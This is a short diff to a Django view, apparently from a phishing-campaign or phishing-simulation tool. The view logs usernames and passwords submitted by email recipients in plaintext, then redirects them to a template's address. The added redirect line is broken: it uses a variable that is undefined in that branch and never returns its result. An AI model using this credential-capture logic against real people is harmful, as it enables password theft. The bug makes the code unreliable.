@@ -66,14 +66,15 @@ def web_estatus(request, int=None):
 
     if request.method == 'POST' and request.POST.get('descarga'):
         plantilla_id = request.POST['plantilla_id']
-        archivo = Plantillas.objects.get(id=plantilla_id).archivo
+        plantilla = Plantillas.objects.get(id=plantilla_id)
+        archivo = plantilla.archivo
         file_path = archivo.path
         return FileResponse(open(file_path, 'rb'))
     
     elif request.method == 'POST' and request.POST.get('credenciales'):
         estatus_web = Estatus_Web.objects.get(enviado=enviado)
         Credenciales.objects.create(estatus_web=estatus_web, usuario=request.POST.get('usuario'), contraseña=request.POST.get('contraseña'))
-
+        redirect(str(plantilla.redireccion))
     plantilla_id = Enviados.objects.get(id=int).plantilla.id
     usuario = Enviados.objects.get(id=int).correo
     html_content = Plantillas.objects.get(id=plantilla_id).plantilla
